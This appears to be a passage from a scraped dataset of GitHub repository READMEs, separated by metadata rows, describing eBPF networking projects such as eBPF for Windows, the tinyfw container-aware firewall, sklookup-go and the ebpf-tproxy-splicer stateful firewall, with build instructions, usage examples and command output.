[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/5742/badge)](https://bestpractices.coreinfrastructure.org/projects/5742)
[![codecov](https://codecov.io/gh/microsoft/ebpf-for-windows/branch/main/graph/badge.svg?token=TXa0UAMvYf)](https://codecov.io/gh/microsoft/ebpf-for-windows)
[![Perf Dashboard](https://img.shields.io/static/v1?label=Performance&message=Dashboard&color=blue)](https://bpfperformancegrafana.azurewebsites.net/public-dashboards/3826972d0ff245158b6df21d5e6868a9?orgId=1)

eBPF is a well-known technology for providing programmability and agility, especially for extending an
OS kernel, for use cases such as DoS protection and observability. This project is a work-in-progress that
allows existing eBPF
toolchains and APIs familiar in the Linux ecosystem to be used on top of Windows.  That is, this project
takes existing eBPF projects as submodules and adds the layer in between to make them run on top of Windows.

## New to eBPF?

See our [basic eBPF tutorial](docs/tutorial.md) and our
[tutorial on debugging eBPF verification failures](docs/debugging.md).

## Architectural Overview

The following diagram shows the basic architecture of this project and related components:

![Architectural Overview](docs/ArchitectureDiagram.svg)

As shown in the diagram, in a typical developer workflow, the existing eBPF toolchains (clang, etc.)
can be used to generate eBPF bytecode (stored in `ELF` format) from source code in various languages.

There are three main approaches to process the eBPF bytecode and load it into Windows kernel.

1. **Native eBPF Program**:
The eBPF bytecode is sent to the `bpf2c` tool in the next phase of the workflow. The `bpf2c` tool passes the
bytecode to the [PREVAIL verifier](https://github.com/vbpf/ebpf-verifier). If the eBPF program passes all the verifier checks,
the `bpf2c` tool converts every instruction in the bytecode to equivalent `C` statements as outlined in the
[native code generation](docs/NativeCodeGeneration.md) document. The generated `C` code is then built into a windows driver
module (stored in a `.sys` file) using the standard visual studio toolchain. The generated driver is also known as the native eBPF program.

   **Note:** This is the *preferred* way of deploying eBPF programs.
   See the [FAQ on HVCI](readme.md#3-will-ebpf-work-with-hypervisor-enforced-code-integrity-hvci) for details as to why this mode is
   also the most secure.

1. **JIT Compiler**
In this approach a user mode service (`eBPFSvc.exe`) *JIT compiles* the eBPF bytecode via the [uBPF](https://github.com/iovisor/ubpf) JIT compiler
into native code that is passed to the kernel-mode execution context.

1. **Interpreter**
In this approach the bytecode can be directly loaded into an *interpreter* (from [uBPF](https://github.com/iovisor/ubpf)) in the
kernel-mode execution context.
       **Note:** The interpreter is present only in debug builds and not in release builds as it is considered less secure.

*Note: The JIT Compiler and Interpreter are not shown in the architecture diagram.*

*Note: For the JIT and interpreter approaches, The `eBPFSvc` service ensures that the eBPF programs pass all the verifier checks.*

The eBPF programs can be consumed by any application, or via bpftool or the Netsh command line tool, which use a shared library (`ebpfapi.dll`) that exposes [Libbpf APIs](https://github.com/libbpf/libbpf). These APIs can be used to load the
eBPF programs to the kernel-mode `execution context`.

eBPF programs that are loaded into the kernel-mode execution context can attach to various
[hooks](https://microsoft.github.io/ebpf-for-windows/ebpf__structs_8h.html#a0f8242763b15ec665eaa47c6add861a0)
and call various helper APIs exposed by the eBPF shim,
which internally wraps public Windows kernel APIs, allowing the use of eBPF on existing versions of Windows.
Many [helpers](https://microsoft.github.io/ebpf-for-windows/bpf__helper__defs_8h.html)
already exist, and more hooks and helpers will be added over time.

## Getting Started

This project supports eBPF on Windows 11 or later, and on Windows Server 2022 or later.
To try out this project, see our [Getting Started Guide](docs/GettingStarted.md).

Want to help?  We welcome contributions!  See our [Contributing guidelines](CONTRIBUTING.md).
Feel free to take a look at our [Good First Issues](https://github.com/microsoft/ebpf-for-windows/labels/good%20first%20issue)
list if you're looking for somewhere to start.

Want to chat with us?  We have a:
* [Slack channel](https://cilium.slack.com/messages/ebpf-for-windows) (If you are new, sign up at http://slack.cilium.io/)
* Zoom meeting for github issue triage: see [meeting info](https://github.com/microsoft/ebpf-for-windows/discussions/427)

For tracking Q&A and general discussion, we use [Discussions](https://github.com/microsoft/ebpf-for-windows/discussions)
in github.  This can also function similar to a mailing list if you subscribe to discussion notifications by
clicking ""Watch"" (or ""Unwatch"") and selecting ""Custom"" -> ""Discussions"" (or by selecting ""All Activity"" if
you want to receive notifications about everything else too).

If you have issues with an eBPF program, start with the [Troubleshooting Guide](docs/TroubleshootingGuide.md).

## Frequently Asked Questions

### 1. Is this a fork of eBPF?

No.

The eBPF for Windows project leverages existing projects, including
the [IOVisor uBPF project](https://github.com/iovisor/ubpf) and
the [PREVAIL verifier](https://github.com/vbpf/ebpf-verifier),
running them on top of Windows by adding the Windows-specific hosting environment for that code.

### 2. Does this provide app compatibility with eBPF programs written for Linux?

The intent is to provide source code compatibility for code that uses common
hooks and helpers that apply across OS ecosystems.

Linux provides many hooks and helpers, some of which are very Linux specific (e.g., using
Linux internal data structs) that would not be applicable to other platforms.
Other hooks and helpers are generically applicable and the intent is to support them for eBPF
programs.

Similarly, the eBPF for Windows project exposes [Libbpf APIs](https://github.com/libbpf/libbpf)
to provide source code compatibility for applications that interact with eBPF programs.

### 3. Will eBPF work with HyperVisor-enforced Code Integrity (HVCI)?

Yes. With HVCI enabled, eBPF programs cannot be JIT compiled, but can be run in the native mode.
To understand why JIT compiled mode does not work, we must first understand what HVCI does.

[HyperVisor-enforced Code Integrity (HVCI)](https://techcommunity.microsoft.com/t5/windows-insider-program/virtualization-based-security-vbs-and-hypervisor-enforced-code/m-p/240571)
is a mechanism
whereby a hypervisor, such as Hyper-V, uses hardware virtualization to protect kernel-mode processes against
the injection and execution of malicious or unverified code. Code integrity validation is performed in a secure
environment that is resistant to attack from malicious software, and page permissions for kernel mode are set and
maintained by the hypervisor.

Since a hypervisor doing such code integrity checks will refuse to accept code pages that aren't signed by
a key that the hypervisor trusts, this does impact eBPF programs running natively.  As such, when HVCI
is enabled, eBPF programs work fine in interpreted mode, but not when using JIT compilation because the JIT
compiler does not have a key that the hypervisor trusts.  And since interpreted
mode is absent in release builds, neither mode will work on an HVCI-enabled production system.

Instead, a third mode is also supported by eBPF for Windows, in addition to JIT compiled and interpreted modes.
This third mode entails compiling eBPF programs into regular Windows drivers that can be accepted by HVCI.
For more discussion, see the [Native Code Generation documentation](docs/NativeCodeGeneration.md).

<small>(Technically, interpreted mode eBPF programs would run with HVCI too, but the interpreter is disabled in release builds
and is only supported in debug builds.)</small>
"
ebpf-networking/tc-nodeport,14,3,14,0,C,POC of K8s Nodeport service using BPF,2022-11-04T03:01:02Z,2025-09-18T16:11:35Z,94,"# Nodeport service load-balancing demo using eBpf 

## tc

tc eBpf demo of Nodeport N-S load balancing and SNAT/ DNAT using recently added kfuncs to support connection tracking and NAT using eBpf programs. This could also be an option to implement L4 Route services for the Kubernetes Gateway API using these new eBpf functions.  

Notes: 
- The design is based on Approach A2 as [documented here](https://gist.github.com/srampal/b300d1a1f847d18d362a55844944f7a7).
- The current version is an initial Proof of Concept/ demo currently meant to validate [Approach A2](https://gist.github.com/srampal/b300d1a1f847d18d362a55844944f7a7) and the use of the newly added kfuncs for managing kernel connection tracking (conntrack) tables.
- This requires a system built with a custom kernel currently (it has been tested using a kernel from bpf-next/ 6.0.0-rc3)
- To build, first recursively load all the sub-modules at the top of the repo (*git submodule update --init --recursive*), then 'make tc' under src 

### Tech Talk
A Tech Talk and demo of this project is [available here](https://youtu.be/4eJYd04R7rY).

### Executing the demo

For the initial demo, the eBpf program is invoked from a CLI command and not via a Kubernetes controller for services (this is to be addressed in a following rev). To run the demo, create a Kubernetes deployment and provide the NodePort and backends via the CLI invocation on the Kubernetes worker nodes. For example: *tc eth0 \<nodeport\> \<backend_ip_1\> \<backend_ip_2\> \<targetPort\>*. (For example *tc eth0 31000 10.240.1.2 10.240.1.3 80*). 

Additional details to be added with future updates ...
"
angelopoerio/tinyfw,23,1,23,0,Rust,A toy containers aware firewall built in Rust,2022-11-27T21:30:22Z,2025-03-05T23:35:06Z,3,"# tinyfw

## Introduction
**tinyfw** is a toy firewall built in Rust and leveraging the [eBPF](https://ebpf.io/what-is-ebpf) technology. The network policies can be attached to any supported network interface. It is also containers aware, the [containerd](https://containerd.io/) runtime is supported.

**IMPORTANT**: at the moment the network policy is hardcoded, it simply drops all the TCP traffic directed to the following ports: **80, 20, 21,23,25, 110,143,139,445,1521,161,162, 70**. If you want to change it, take a look [here](https://github.com/angelopoerio/tinyfw/blob/main/tinyfw-ebpf/src/main.rs).


## Prerequisites

1. Install a rust stable toolchain: `rustup install stable`
1. Install a rust nightly toolchain: `rustup install nightly`
1. Install bpf-linker: `cargo install bpf-linker`


## Build eBPF

```bash
cargo xtask build-ebpf
```

To perform a release build you can use the `--release` flag.
You may also change the target architecture with the `--target` flag


## Build Userspace

```bash
cargo build
```

To perform a release build you can use the `--release` flag.


## Run

```bash
cargo xtask run
```


## How to use
The tool can be used in two ways:
* attach to a user specified network interface. Flag is **--iface**
* **containers mode**: it will try to connect to the unix socket of the local running **containerd** daemon listening for new spawned containers, so that XDP/eBPF rules can be attached on demand. You can use the flag **--cmode** for this.


## Run on Kubernetes
It is possible to run the tool as a Kubernetes [daemonset](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/). In order for it to work the following conditions must be met:
* Run as a privileged daemonset. This is required to list the network interfaces on the host and attach ebpf code to them. Learn more [here](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
* Mount the containerd unix socket as an **hostpath**. Learn more [here](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath).


# Troubleshooting
A useful tool to trobleshoot **tinyfw** (and any ebpf based networking tool) is bpftool. For example to inspect the ebpf programs attached to the [veth](https://developers.redhat.com/blog/2018/10/22/introduction-to-linux-interfaces-for-virtual-networking#iveth) interfaces (the network interfaces used by the containers) of an host you can type the following command:
```bash

bpftool net show
xdp:
veth7c2e2820(19) driver id 295
veth183ae1ae(23) driver id 295
veth8c690d33(24) driver id 295
vethff389ec(31) driver id 295

tc:

flow_dissector:
```
**IMPORTANT**: Remember to set the env variable **RUST_LOG=info** before running tinyfw to have runtime informations of what it's going on!

## Why support only containerd?
Containerd is becoming the standard de facto for containers runtime. [AWS EKS](https://docs.aws.amazon.com/eks/latest/userguide/dockershim-deprecation.html) is for example moving to it as the default runtime.


## Misc & Links
The author of this project is **Angelo Poerio <angelo.poerio@gmail.com>**

**IMPORTANT**: THIS TOOL IS NOT **PRODUCTION READY**. Use it at your own risks!

Useful links:
* [Aya](https://aya-rs.dev/)
* [eBPF](https://ebpf.io/)

TODO:
* Better way to correlate veth(s) interfaces to containers
* Make network policies configurable and not hardcoded
"
fbac/sklookup-go,29,3,29,3,C,eBPF sk_lookup program as a golang library,2022-09-19T10:46:17Z,2024-04-14T17:18:22Z,26,"# sklookup-go

- [sklookup-go](#sklookup-go)
  - [What is sk_lookup](#what-is-sk_lookup-wip-section)
  - [Use cases](#use-cases-wip-section)
  - [Requirements](#requirements)
  - [Usage](#usage)
    - [As golang package](#as-golang-package)
    - [As cli](#as-cli)
    - [Tested OS, kernels and libbpf](#tested-os-kernels-and-libbpf)
      - [Ubuntu 22.04.1 LTS - Jammy](#ubuntu-22041-lts---jammy)
      - [Fedora release 36 (Thirty Six)](#fedora-release-36-thirty-six)
  - [To Do](#to-do)
  - [Demonstration](#demonstration)

## What is sk_lookup

Fast introduction to technologies used:

- eBPF
- BTF
- bpf2go
- sk_lookup <https://www.kernel.org/doc/html/latest/bpf/prog_sk_lookup.html>

## Use cases

- Attaching ports to an already running service
- Serving applications from multiple ports while binding only to one
- Ideal solution for proxies
- Rule of cool: why not use eBPF when it's just simply so cool?

## Requirements

- golang 1.18
- libbpf
- libbpf-dev

## Usage

### As golang package

- Additional ports can be attached to a specific pid, when the caller and target processes are not the same.

```go
import ""github.com/fbac/sklookup-go/pkg/ebpf""

func main() {
 name := ""AppName""
 pid := 165929
 ports := []uint16{222, 2222, 1111, 7878}
 loglevel := ""debug""

 ebpf.NewExternalDispatcher(name, pid, ports, loglevel).InitializeDispatcher()
}
```

- Or by attaching a file descriptor, when the caller and target processes are the same.
  
```go
import ""github.com/fbac/sklookup-go/pkg/ebpf""

func main() {
 // Resolve and listen to and create a listener into some address
 addr, err := net.ResolveTCPAddr(""tcp"", fmt.Sprintf(""%v"", "":443""))
 if err != nil {
  log.Fatalln(err)
 }

 listener, err := net.ListenTCP(""tcp"", addr)
 if err != nil {
  log.Fatalln(err)
 }
 defer listener.Close()

 // Get listener's file descriptor by retrieving it as a file
 f, _ := listener.File()
 defer f.Close()

 name := ""AppName""
 fd := f.Fd() // Pass the fd into eBPF dispatcher
 ports := []uint16{1025, 1026, 1027, 1028}
 loglevel := ""debug""

 ebpf.NewInternalDispatcher(name, fd, ports, loglevel).InitializeDispatcher()
}
```

### As cli

- Build

```bash
make build-cli
```

- Usage options
  - Note that `sk` must be run as root, since it requires loading eBPF programs and maps into kernel memory. Otherwise your system should allow unprivileged eBPF code, and that's not secure and not a scope of this project.

```bash
$ sudo bin/sk start -h

Start targets a PID, and steer all the connections from the provided additional ports to the socket where it's listening

Usage:
  sk start [flags]

Flags:
  -h, --help              help for start
  -l, --loglevel string   Log-level to run the app. Available: info, debug, panic. (default ""info"")
  -n, --name string       Descriptive name for the application (default ""sk_lookup"")
      --pid int           Target process PID (default -1)
  -p, --ports uints       Additional ports (default [])
  -t, --toggle            Help message for toggle
```

### Tested OS, kernels and libbpf

The proxy has been tested in the following OS, with the respective kernel and bpf tools versions.

Also, it's **required** to run it as **root** user.

The system must be able to run BPF programs.

#### Ubuntu 22.04.1 LTS - Jammy

- Kernel `5.15.0-47-generic`

- golang 1.18

- BPF packages:

```bash
binutils-bpf/jammy 2.38-2ubuntu1+3 amd64
bpftrace/jammy 0.14.0-1 amd64
libbpf-dev/jammy 1:0.5.0-1 amd64
libbpf0/jammy,now 1:0.5.0-1 amd64 [installed,automatic]
```

#### Fedora release 36 (Thirty Six)

- Kernel `5.18.17-200.fc36.x86_64`
- golang 1.18
- BPF packages:

```bash
libbpf-0.7.0-3.fc36.x86_64
libbpf-devel-0.7.0-3.fc36.x86_64
bpftrace-0.14.1-1.fc36.x86_64
bpftool-5.19.4-200.fc36.x86_64
```

## To Do

- Use os.Env and/or viper to supply parameters
- Finish README.md

## Demonstration

Let's add additional ports to an old good sshd server

Said sshd server is running inside a virtual machine.

- Scanning open ports

```bash
# nmap -sT -p 1-10000 192.168.122.172

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 16:21 CEST
Nmap scan report for 192.168.122.172
Host is up (0.00020s latency).
Not shown: 9999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 52:54:00:74:4B:83 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

- Build `sk` and copy into the vm

```bash
$ make build-cli

# sklook build started
mkdir -p bin
go build -o bin/sk .

$ scp bin/sk root@192.168.122.172:/tmp
sk 100% 5709KB  17.6MB/s   00:00 
```

- Login into the vm and get sshd PID

```bash
$ pidof sshd
627
```

- Run `sk` against the target PID and with as many as additional ports as needed. (max ports 1024)

```bash
root@vm:~# /tmp/sk start --pid 627 --ports 2,22,222,1111,1010,9999 --name sshd-vm --loglevel debug &
[1] 2109

root@vm:~# {""level"":""info"",""time"":""2022-09-19T14:27:40Z"",""message"":""eBPF dispatcher with name sshd-vm initializing""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""Prog SkLookup(sk_dispatch)#6 is pinned: true""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""Map SockMap(target_socket)#5 is pinned: true""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""Map Hash(add_ports)#4 is pinned: true""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""listener FD: 7""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""adding port: 2""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""adding port: 22""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""adding port: 222""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""adding port: 1111""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""adding port: 1010""}
{""level"":""debug"",""time"":""2022-09-19T14:27:40Z"",""message"":""adding port: 9999""}
{""level"":""info"",""time"":""2022-09-19T14:27:40Z"",""message"":""eBPF dispatcher sshd-vm initialized. Dispatching traffic from ports [2 22 222 1111 1010 9999] to original pid 627""}
```

- From your host, scan again the vm open ports

```bash
[root@hyperion ~]# nmap -sT -p 1-10000 192.168.122.172
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 16:29 CEST
Nmap scan report for 192.168.122.172
Host is up (0.00019s latency).
Not shown: 9994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
2/tcp    open  compressnet
22/tcp   open  ssh
222/tcp  open  rsh-spx
1010/tcp open  surf
1111/tcp open  lmsocialserver
9999/tcp open  abyss
MAC Address: 52:54:00:74:4B:83 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

- Try to connect to any of them

```bash
[root@localhost ~]# ssh root@192.168.122.172 -p 9999

The authenticity of host '[192.168.122.172]:9999 ([192.168.122.172]:9999)' can't be established.
ED25519 key fingerprint is SHA256:MsHOzsCjHKvahbf45QnFgxpEaIF7mdhCWGiKOs8vPns.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

- In the vm, the pinned eBPF program and maps are pinned in a bpf filesystem

```bash
root@proxy-last:~# ls -l //sys/fs/bpf/
total 0
-rw------- 1 root root 0 Sep 19 14:27 dispatch_link-sshd-vm
-rw------- 1 root root 0 Sep 19 14:27 dispatch_prog-sshd-vm
-rw------- 1 root root 0 Sep 19 14:27 port-sshd-vm
-rw------- 1 root root 0 Sep 19 14:27 sock-sshd-vm
```

- Also, the eBPF program and maps can be debugged as usual using `bpftool`

```bash
[root@localhost ~]#  bpftool prog show pinned /sys/fs/bpf/dispatch_prog-sshd-vm

201: sk_lookup  name sk_dispatch  tag da043673afd29081  gpl
 loaded_at 2022-09-19T16:34:02+0200  uid 0
 xlated 272B  jited 156B  memlock 4096B  map_ids 270,271
 btf_id 380
 pids sk(423122)
```

- Check pinned maps by id (or by path)

```bash
[root@localhost ~]# bpftool map show id 271

271: sockmap  name target_socket  flags 0x0
 key 4B  value 8B  max_entries 1  memlock 4096B
 pids sk(423122)
```

- Check map contents

```bash
[root@hyperion ~]#  bpftool map dump pinned /sys/fs/bpf/sock-sshd-vm 
key: 00 00 00 00  value: 04 20 00 00 00 00 00 00
Found 1 element
```

```bash
[root@hyperion ~]#  bpftool map dump pinned /sys/fs/bpf/port-sshd-vm $
[{
        ""key"": 1010,
        ""value"": 0
    },{
        ""key"": 9999,
        ""value"": 0
    },{
        ""key"": 22,
        ""value"": 0
    },{
        ""key"": 1111,
        ""value"": 0
    },{
        ""key"": 222,
        ""value"": 0
    },{
        ""key"": 2,
        ""value"": 0
    }
}]
```
"
r-caamano/ebpf-tproxy-splicer,32,9,32,0,C,This is a project to develop an ebpf program that uses ebpf tc to redirect ingress ipv4 udp/tcp flows toward specific dynamically created sockets and acts as a stateful firewall.  ,2022-10-06T13:43:05Z,2025-06-20T21:18:34Z,347,"# ARCHIVED
  ## Project moved to https://github.com/netfoundry/zfw

                                   

## Introduction
--- 
This is a project to develop an eBPF program that utilizes tc-bpf to act as a statefull ingress FW and to redirect 
ingress ipv4 udp/tcp flows toward dynamically created sockets that correspond to zero trust based services on OpenZiti
edge-routers. Those interested on how to setup an openziti development environment should visit 
https://github.com/openziti/ziti. 
Also note this is eBPF tc based so interception only occurs for traffic ingressing on the interface that the eBPF program
is attached to. To intercept packets generated locally by the router itself the eBPF program would need to be attached to
the loopback interface. The eBPF program also provides stateful inbound firewalling and only allows ssh, dhcp and arp
bypass by default. Initially the program will allow ssh to any address inbound however after the first tproxy mapping is
inserted by the map_update tool it will only allow ssh addressed to the IP address of the interface that tc has loaded the
eBPF program.  All other traffic must be configured as a service in an OpenZiti Controller which then informs the edge-router
which traffic flows to accept. The open ziti edge-router then uses the map_update user space app to insert rules to
allow traffic in on the interface tc is running on. For those interested in additional background on the project please visit: 
https://openziti.io/using-ebpf-tc-to-securely-mangle-packets-in-the-kernel-and-pass-them-to-my-secure-networking-application.  


## Build
---
[To build from source. Click here!](./BUILD.md)

## Management After Deployment
---

### Attaching to interface

```bash   
sudo map_update --set-tc-filter <interface name> --object-file=tproxy_splicer.o --direction=ingress
sudo map_update --set-tc-filter <interface name>--object-file=outbound_track.o --direction=egress //optional only if firewalling subtending devices see below
sudo ufw allow in on <interface name> to any
```

ebpf will now take over firewalling this interface and only allow ssh, dhcp and arp till ziti
services are provisioned as inbound intercepts via the map_udate app. Router will statefully allow responses to router
initiated sockets as well. tc commands above do not survive reboot so would need to be added to startup service / script.

A new addtion is firewall support for subtending devices for two interface scenarios i.e.
external and trusted.

    external inet <----> (ens33)[ebpf-router](ens37) <----> trusted clients

    with tproxy-splicer.o applied ingress on ens33 and oubound_track.o applied egress on ens33 the router will
    statefully track outbound udp and tcp connections on ens33 and allow the associated inbound traffic.  While
    running in this mode it does not make sense to add ziti tproxy rules and is meant for running as a traditional fw.
    As be for you can also create passthrough FW rules (set -t --tproxy-port to 0) which would also make sense in the mode for
    specific internet initiated traffic you might want to allow in.

    TCP:
        If the tcp connections close gracefully then the entries will remove upon connection closure. 
        if not then there is a 60 minute timeout that will remove the in active state if no traffic seen
        in either direction.

    UDP:
        State will remain active as long as packets tuples matching SRCIP/SPORT/DSTIP/DPORT are seen in
        either direction within 30 seconds.  If no packets seen in either dorection the state will expire.
        If an external packet enters the interface after expire the entry will be deleted.  if an egress
        packet fined a matching expired state it will return the state to active.

    In order to support this per interface rule awareness was added which allows each port range within a prefix
    to match a list of connected interfaces.  On a per interface basis you can decide to honor that list or not via
    a per-prefix-rules setting in the following manner via the map_update utility
    
    singly:
    ```
    sudo map_update -P <ifname>
    ```
    or 

    all interfaces:
    ```
    sudo map_update -P all
    ```

    In order to assign 1 to 3 interfaces to a rule you would use the new -N option in combination with the -I i.e.
    to associate the rule to end37 and lo:

    ```
    sudo map_update -I -c 172.16.31.0 -m 24 -l 443 -h 443 -t 44000 -p tcp -N ens37 -N lo
    ```

### Openziti Ingress

Testing with ziti-router after attaching. Build a ziti network first and create services as explained at [Host It Anywhere](https://docs.openziti.io/docs/learn/quickstarts/network/hosted/)

Grab the edge router binary `(>= v0.27.3)` at [open ziti](https://github.com/openziti/ziti/releases).

```bash
# Copy the user space map program to folder in $PATH i.e
sudo cp map_update /usr/bin

# In the router config.yml set tunnel mode to ebpf i.e.   
- binding: tunnel
  options:
    mode: tproxy:/path/to/map_update

# Run edge router command 
# Note: assumption - ziti-router and config.yml in PATH
sudo ziti-router run config.yml
```

### Detaching from interface:

```bash
sudo map_update --set-tc-filter <interface name>  --direction <ingress | egress> --disable
```

## Ebpf Map User Space Management
---
Example: Insert map entry to direct SIP traffic destined for 172.16.240.0/24

```bash
Usage: ./map_update -I <ip dest address or prefix> -m <prefix length> -l <low_port> -h <high_port> -t <tproxy_port> -p <protocol>

sudo ./map_update -I -c 172.16.240.0 -m 24 -l 5060 -h 5060 -t 58997 -p udp
```

As mentioned earlier if you add -r, --route as argument the program will add 172.16.240.0/24 to the ""lo"" interface if it
does not overlap with an external LAN interface subnet.

Example: Disable ssh from interface.

This will disable default ssh action to pass to ip of local interface and then fall through to rule check instead where a more specific rule could
be applied.  This is a per interface setting and can be set for all interfaces except loopback.

```bash
Usage: ./map_update -x <interface-name> | all

sudo sudo ./map_update -x ens33
```


Example: Insert map entry to with source filteing to only allow rule for ip source 10.1.1.1/32.

```bash
Usage: ./map_update -I -c <ip dest address or prefix> -m <dest prefix len> -o <origin address or prefix> -n <origin prefix len> -l <low_port> -h <high_port> -t <tproxy_port> -p <protocol>

sudo sudo ./map_update -I -c 172.16.240.0 -m 24 -o 10.1.1.1 -n 32  -p tcp -l 22 -h 22 -t 0
```

Example: Insert FW rule for local router tcp listen port 443 where local router's tc interface ip address is 10.1.1.1
with tproxy_port set to 0 signifying local connect rule

```bash
sudo ./map_update -I -c 10.1.1.1 -m 32 -l 443 -h 443 -t 0 -p tcp  
```

Example: Monitor ebpf trace messages

```
sudo map_update -v all
sudo cat /sys/kernel/debug/tracing/trace_pipe
  
<idle>-0       [007] dNs.. 167940.070727: bpf_trace_printk: ens33
<idle>-0       [007] dNs.. 167940.070728: bpf_trace_printk: source_ip = 0xA010101
<idle>-0       [007] dNs.. 167940.070728: bpf_trace_printk: dest_ip = 0xAC10F001
<idle>-0       [007] dNs.. 167940.070729: bpf_trace_printk: protocol_id = 17
<idle>-0       [007] dNs.. 167940.070729: bpf_trace_printk: tproxy_mapping->5060 to 59423

<idle>-0       [007] dNs.. 167954.255414: bpf_trace_printk: ens33
<idle>-0       [007] dNs.. 167954.255414: bpf_trace_printk: source_ip = 0xA010101
<idle>-0       [007] dNs.. 167954.255415: bpf_trace_printk: dest_ip = 0xAC10F001
<idle>-0       [007] dNs.. 167954.255415: bpf_trace_printk: protocol_id = 6
<idle>-0       [007] dNs.. 167954.255416: bpf_trace_printk: tproxy_mapping->22 to 39839

```
Example: Remove previous entry from map
```bash
Usage: ./map_update -D -c <ip dest address or prefix> -m <prefix len> -l <low_port> -p <protocol>

sudo ./map_update -D -c 172.16.240.0 -m 24 -l 5060 -p udp
```

Example: Remove all entries from map
```
Usage: ./map_update -F

sudo ./map_update -F
```

Example: List all rules in map
```
Usage: ./map_update -L

sudo ./map_update -L

target     proto    origin              destination               mapping:                                                   interface list
------     -----    ---------------     ------------------        --------------------------------------------------------- ----------------
TPROXY     tcp      0.0.0.0/0           10.0.0.16/28              dpts=22:22                TPROXY redirect 127.0.0.1:33381  [ens33,lo]
TPROXY     tcp      0.0.0.0/0           10.0.0.16/28              dpts=30000:40000          TPROXY redirect 127.0.0.1:33381  []
TPROXY     udp      0.0.0.0/0           172.20.1.0/24             dpts=5000:10000           TPROXY redirect 127.0.0.1:59394  []
TPROXY     tcp      0.0.0.0/0           172.16.1.0/24             dpts=22:22                TPROXY redirect 127.0.0.1:33381  []
TPROXY     tcp      0.0.0.0/0           172.16.1.0/24             dpts=30000:40000          TPROXY redirect 127.0.0.1:33381  []
PASSTHRU   udp      0.0.0.0/0           192.168.3.0/24            dpts=5:7                  PASSTHRU to 192.168.3.0/24       []
PASSTHRU   udp      10.1.1.1/32         192.168.100.100/32        dpts=50000:60000          PASSTHRU to 192.168.100.100/32   []
PASSTHRU   tcp      10.230.40.1/32      192.168.100.100/32        dpts=60000:65535          PASSTHRU to 192.168.100.100/32   []
TPROXY     udp      0.0.0.0/0           192.168.0.3/32            dpts=5000:10000           TPROXY redirect 127.0.0.1:59394  []
PASSTHRU   tcp      0.0.0.0/0           192.168.100.100/32        dpts=60000:65535          PASSTHRU to 192.168.100.100/32   []
```
Example: List rules in map for a given prefix and protocol
```bash
# Usage: ./map_update -L -c <ip dest address or prefix> -m <prefix len> -p <protocol>
  
sudo map_update -L -c 192.168.100.100 -m 32 -p udp
  
target     proto    origin           destination              mapping:                                                  interface list
------     -----    --------         ------------------       --------------------------------------------------------- ------------------    
PASSTHRU   udp      0.0.0.0/0        192.168.100.100/32       dpts=50000:60000 	      PASSTHRU to 192.168.100.100/32     []
``` 

Example: List rules in map for a given prefix
```bash
# Usage: ./map_update -L -c <ip dest address or prefix> -m <prefix len> -p <protocol>

sudo map_update -L -c 192.168.100.100 -m 32

target     proto    origin           destination              mapping:                                                  interface list
------     -----    --------         ------------------       --------------------------------------------------------- -------------------
PASSTHRU   udp      0.0.0.0/0        192.168.100.100/32       dpts=50000:60000 	      PASSTHRU to 192.168.100.100/32     []
PASSTHRU   tcp      0.0.0.0/0        192.168.100.100/32       dpts=60000:65535	      PASSTHRU to 192.168.100.100/32     []
```
Example: List all interface setting
```bash
Usage: ./map_update -L -E

sudo ./map_update -E

lo:
--------------------------
icmp echo               :1
verbose                 :0
ssh disable             :0
per interface           :0
tc ingress filter       :1
tc egress filter        :0
--------------------------

ens33:
--------------------------
icmp echo               :0
verbose                 :1
ssh disable             :1
per interface           :1
tc ingress filter       :1
tc egress filter        :1
--------------------------

ens37:
--------------------------
icmp echo               :0
verbose                 :0
ssh disable             :0
per interface           :0
tc ingress filter       :1
tc egress filter        :0
--------------------------
```

Example: Remove all tc-ebpf on router
```bash
Usage: ./map_update -Q,--disable-ebpf

sudo map_update --disable-ebpf
tc parent del : lo
tc parent del : ens33
tc parent del : ens37
removing /sys/fs/bpf/tc/globals/zt_tproxy_map
removing /sys/fs/bpf/tc/globals/diag_map
removing /sys/fs/bpf/tc/globals/ifindex_ip_map
removing /sys/fs/bpf/tc/globals/tuple_count_map
removing /sys/fs/bpf/tc/globals/prog_map
removing /sys/fs/bpf/tc/globals/udp_map
removing /sys/fs/bpf/tc//globals/matched_map
removing /sys/fs/bpf/tc/globals/tcp_map
```


## Additional Distro testing
---

Fedora 36 kernel 6.0.5-200

On fedora I found that NetworkManager interferes with eBPF socket redirection and can
be unpredictable so belowis what I changed to get it working consistently. Other less
intrusive methods not requiring removal of NM might also be possible.

```bash
sudo yum install network-scripts
sudo systemctl enable network
sudo yum remove NetworkManager

sudo vi /etc/sysconfig/network-scripts/ifcfg-eth0

# if eth0 will be dhcp then something like:
BOOTPROTO=dhcp
DEVICE=eth0
ONBOOT=yes

# or if static
BOOTPROTO=static
IPADDR=192.168.61.70
NETMASK=255.255.255.0
DEVICE=eth1
ONBOOT=yes
```

The following grub change is only necessary on systems that do not use ethX naming by
default like vmware. this changes fedora back to using ethX for interface naming network-scripts looks for this nomenclature and will fail DHCP otherwise

```bash 
sudo vi /etc/default/grub

# change:
GRUB_CMDLINE_LINUX=""rd.lvm.lv=fedora_fedora/root rhgb quiet""

# to:
